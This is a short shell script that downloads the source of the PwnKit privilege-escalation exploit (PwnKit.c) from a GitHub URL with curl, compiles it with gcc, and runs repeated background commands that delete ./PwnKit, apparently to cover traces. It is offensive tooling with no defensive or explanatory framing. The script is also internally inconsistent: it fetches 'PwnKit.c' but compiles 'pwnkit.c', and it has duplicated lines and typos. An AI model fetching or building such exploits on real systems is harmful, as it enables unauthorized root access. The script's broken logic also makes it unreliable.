echo "Creating SH File..."
printf "curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit/main/PwnKit.c -o PwnKit.c\n" > start.sh
(sleep 1 && rm ./PwnKit & )
chmod u+x ./start.sh
(sleep 1 && rm ./PwnKit & )
echo "Fetching C source..."
./start.sh
(sleep 1 && rm ./PwnKit & )
echo "Done."
echo "Creating ecxecutable..."
gcc -o pwnkit pwnkit.c
(sleep 1 && rm ./PwnKit & )
echo "Done."
echo "Cleaning up..."
#rm -rf start.sh
(sleep 1 && rm ./PwnKit & )
echo "Done."
